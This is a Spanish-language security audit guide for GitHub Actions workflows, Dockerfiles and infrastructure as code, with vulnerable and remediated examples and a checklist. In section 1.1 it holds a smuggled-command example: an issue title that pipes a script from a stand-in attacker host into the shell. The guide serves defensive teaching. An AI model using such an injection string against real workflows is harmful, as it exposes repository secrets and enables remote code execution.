# Auditoría de Seguridad: CI/CD (GitHub Actions), Docker e IaC

Esta guía extiende la auditoría de la cadena de suministro de software (*Software Supply Chain Failures*) hacia los flujos de integración continua (CI/CD), contenedores Docker y configuraciones de infraestructura como código (IaC).

---

## 1. Auditoría de Workflows de GitHub Actions (`.github/workflows/`)

### 1.1 Inyección de Comandos en Pasadas inline (`run:`)
- **Riesgo**: Si un workflow evalúa expresiones de contexto del evento de GitHub directamente dentro de comandos de shell (`run:`), un atacante puede inyectar comandos maliciosos a través del título de un Issue, el nombre de una rama o el cuerpo de un Pull Request.
- **Patrón Vulnerable SAST**:
  ```yaml
  # ❌ VULNERABLE: Inyección de comandos a través del título del issue
  - name: Imprimir título
    run: |
      echo "El título es: ${{ github.event.issue.title }}"
  ```
  *Si el título del issue es `test"; curl http://attacker.com/malware.sh | sh; echo "`, la shell ejecuta el malware con acceso a los secretos del repositorio.*
- **Remediación**: Pasar los datos del evento a través de variables de entorno explícitas:
  ```yaml
  # ✅ SEGURO: Uso de variables de entorno para aislar el input
  - name: Imprimir título
    env:
      ISSUE_TITLE: ${{ github.event.issue.title }}
    run: |
      echo "El título es: $ISSUE_TITLE"
  ```

---

### 1.2 Acciones de Terceros No Pineadas por Commit SHA
- **Riesgo**: Usar tags flotantes de acciones (ej. `uses: actions/checkout@v3` o `@main`) expone al repositorio a ataques en la cadena de suministro si la cuenta del desarrollador de la acción es comprometida o su tag es movido a una versión maliciosa.
- **Remediación**: Pinear TODAS las acciones de terceros usando su hash commit SHA inmutable:
  ```yaml
  # ✅ SEGURO: Pineado por commit SHA
  uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
  ```

---

### 1.3 Permisos Excesivos en `GITHUB_TOKEN`
- **Riesgo**: Por defecto, si el workflow no define el bloque `permissions:`, el `GITHUB_TOKEN` puede tener permisos de lectura y escritura en todo el repositorio (`contents: write`, `packages: write`, etc.).
- **Remediación**: Aplicar el principio de mínimo privilegio agregando un bloque `permissions` global o a nivel de job:
  ```yaml
  permissions:
    contents: read
    issues: read
  ```

---

### 1.4 Mal Uso de `pull_request_target`
- **Riesgo**: El evento `pull_request_target` se ejecuta en el contexto de la rama base y tiene acceso a los **Secretos del Repositorio**. Si el workflow hace checkout del código del PR del fork (`github.event.pull_request.head.sha`) y ejecuta comandos o scripts de construcción, un atacante puede enviar un PR que extraiga los secretos del repositorio.
- **Remediación**: NUNCA ejecutar scripts de construcción o tests del código de un fork no confiable dentro de un workflow gatillado por `pull_request_target`. Usar `pull_request` estándar para código no confiable (sin acceso a secretos).

---

## 2. Auditoría de Seguridad en Dockerfiles

### 2.1 Ejecución de Contenedores como Usuario `root`
- **Riesgo**: Si un contenedor se ejecuta como `root` y sufre una falla de escape de contenedor (container escape vulnerability), el atacante obtiene privilegios de `root` en el host subyacente.
- **Remediación**: Crear y cambiar a un usuario sin privilegios en el Dockerfile:
  ```dockerfile
  RUN adduser -D appuser
  USER appuser
  ```

---

### 2.2 Exposición de Secretos en Instrucciones `ENV` o `ARG`
- **Riesgo**: Las variables `ENV` y `ARG` quedan grabadas en el historial de capas de la imagen Docker (`docker history`). Cualquier persona con acceso a la imagen puede extraerlas.
- **Remediación**: Usar Secret Mounting de BuildKit (`RUN --mount=type=secret...`) para acceder a claves durante la construcción sin grabarlas en la imagen final.

---

### 2.3 Ausencia de `.dockerignore`
- **Riesgo**: Si no existe `.dockerignore`, el comando `COPY . .` copia carpetas como `.git` (con todo el historial de commits y claves históricas), `.env`, `node_modules` y archivos de credenciales locales a la imagen final.
- **Remediación**: Crear `.dockerignore` incluyendo al menos:
  ```
  .git
  .env*
  node_modules
  dist
  *.log
  ```

---

## 3. Checklist Rápido de IaC (Infrastructure as Code)

- [ ] ¿Los workflows de GitHub Actions usan variables de entorno para aislar expresiones `${{ ... }}` en la shell?
- [ ] ¿Están las GitHub Actions de terceros pineadas por Commit SHA inmutable?
- [ ] ¿El bloque `permissions:` está explícitamente definido en los workflows?
- [ ] ¿El Dockerfile cambia a un usuario no `root` antes del `CMD`/`ENTRYPOINT`?
- [ ] ¿Existe un archivo `.dockerignore` que excluya `.git` y `.env`?
- [ ] ¿Las imágenes base usan versiones específicas o hashes en lugar de `latest`?
